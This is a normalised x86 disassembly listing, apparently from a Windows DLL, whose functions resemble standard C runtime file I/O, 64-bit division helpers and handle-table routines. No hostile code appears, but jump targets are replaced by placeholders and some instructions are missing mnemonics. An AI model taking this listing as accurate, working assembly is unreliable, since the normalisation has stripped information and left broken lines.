lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_10009e65
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_10004f88
mov [ eax ] 0x1c
call sub_10004f91
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_10004f15
pop ecx
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
mov [ eax ] esi
jmp r-xdata
sub_1000a0c8
inc [ rw-data ]
push 0x1000
call sub_100049d2
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_1000a10c
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_1000a135
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a18e
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_10006a09
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_10006a6a
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000a18e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_10004f88
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_1000a200
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000a270
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1000a2e5
push ebx
push edi
push 0x2
xor ebx ebx
call sub_10006a09
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_10006a6a
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_100041bf
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_1000413e
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_1000a366
push ecx
push ecx
push ebx
push ebp
push esi
push edi
push 0x12
or edi 0xffffffff
call sub_10006a09
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov ebp rw-data
mov esi 0x480
push esi
call sub_100049d2
test eax eax
pop ecx
je r-xdata
lea eax [ esi + 0x480 ]
push 0x12
call sub_10006a6a
pop ecx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
add [ rw-data ] 0x20
lea ecx [ ebx * 4 + rw-data ]
lea edx [ eax + 0x480 ]
mov [ ecx ] eax
add [ esp + 0x14 ] 0x20
add ebp 0x4
inc ebx
cmp ebp rw-data
mov [ esp + 0x10 ] ebx
jl r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl ebx 0x5
mov edi ebx
push edi
call sub_1000a5c6
pop ecx
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x24
add edx esi
jmp r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp ]
add esi 0x24
add eax 0x480
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp eax edx
jae r-xdata
cmp esi eax
jae r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
push 0x11
call sub_10006a09
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
or [ esi ] 0xffffffff
mov eax esi
sub eax [ ebp ]
push 0x24
pop ecx
cdq
idiv ecx
mov edi eax
add edi [ esp + 0x14 ]
cmp edi 0xffffffff
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x10 ]
push 0x11
call sub_10006a6a
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov ebx [ esp + 0x10 ]
sub_1000a489
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
cmp [ eax + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000a505
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_1000a584
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
and [ eax ] 0x0
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 4 + 0x4 ] 0x1
lea eax [ ecx + eax * 4 ]
je r-xdata
mov eax [ eax ]
retn
sub_1000a5c6
mov eax [ esp + 0x4 ]
push ebx
mov ecx eax
and eax 0x1f
sar ecx 0x5
push esi
push edi
mov esi [ ecx * 4 + rw-data ]
lea ebx [ ecx * 4 + rw-data ]
lea edi [ eax + eax * 8 ]
shl edi 0x2
add esi edi
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
pop edi
pop esi
pop ebx
retn
push 0x11
call sub_10006a09
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
push 0x11
call sub_10006a6a
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
sub_1000a647
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_1000a5c6
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10004f88
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_1000a584
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_1000a625
pop ecx
mov eax esi
jmp r-xdata
call sub_10004f91
mov [ eax ] esi
test esi esi
je r-xdata
sub_1000a6da
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
call sub_10004f88
mov [ eax ] 0x16
call sub_10004f91
mov [ eax ] ebx
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_1000a366
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi __dos_header
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
call sub_10004f88
mov [ eax ] 0x18
call sub_10004f91
and [ eax ] 0x0
mov eax edi
jmp r-xdata
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_10004f15
pop ecx
mov esi edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
call sub_1000a625
pop ecx
mov eax esi
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_1000a489
mov eax ebx
pop ecx
sar eax 0x5
pop ecx
mov cl [ ebp - 0x1 ]
lea edi [ eax * 4 + rw-data ]
mov eax ebx
or cl 0x1
and eax 0x1f
mov [ ebp + 0xb ] cl
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
and [ ebp + 0xb ] 0x48
mov [ eax + esi + 0x4 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test cl 0x80
je r-xdata
mov esi ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_10009e65
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_1000adf6
add esp 0xc
test eax eax
jne r-xdata
call sub_10004f91
cmp [ eax ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_10009e65
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
push ebx
call sub_1000771e
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebp - 0x10 ]
push ebx
call sub_1000ac6c
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_1000aa10
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_1000aa99
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_10009230
pop ecx
mov edi eax
call sub_1000b1cd
test eax eax
jne r-xdata
push eax
call sub_10009230
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_1000b18e
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_1000ab20
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_1000ab60
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_1000ab98
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_1000931a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_1000ac6c
push ebp
mov ebp esp
mov eax 0x1004
call sub_10004190
push ebx
push esi
xor esi esi
push 0x1
push esi
push [ ebp + 0x8 ]
call sub_10009e65
or ebx 0xffffffff
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax ebx
push 0x2
push esi
push [ ebp + 0x8 ]
call sub_10009e65
add esp 0xc
cmp eax ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
mov ebx 0x1000
lea eax [ ebp - 0x1004 ]
push ebx
push esi
push eax
call sub_10004940
push 0x8000
push [ ebp + 0x8 ]
call sub_1000b3d1
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10009e65
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10009e65
push [ ebp + 0x8 ]
call sub_1000a584
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi ebx
jne r-xdata
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp + 0x8 ]
call sub_10009f3d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
call sub_10004f88
mov [ eax ] 0xd
call [ GetLastError@IAT ]
mov edi eax
call sub_10004f91
mov [ eax ] edi
call sub_10004f91
cmp [ eax ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
call sub_10004f88
mov [ eax ] 0xd
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b3d1
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
cmp edi ebx
mov eax ebx
jge r-xdata
sub_1000ad91
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000a5c6
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_1000adf6
push esi
mov edi eax
call sub_1000a625
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_1000adf6
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_10004f15
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_10009e65
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_1000afcf
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
dec eax
push ebx
push esi
dec eax
push edi
je r-xdata
mov ebx [ rw-data ]
mov edi rw-data
dec eax
dec eax
je r-xdata
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_100067bc
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_1000b151
mov edi eax
pop ecx
add edi 0x8
pop ecx
mov ebx [ edi ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
cmp [ ebp - 0x4 ] ecx
je r-xdata
xor eax eax
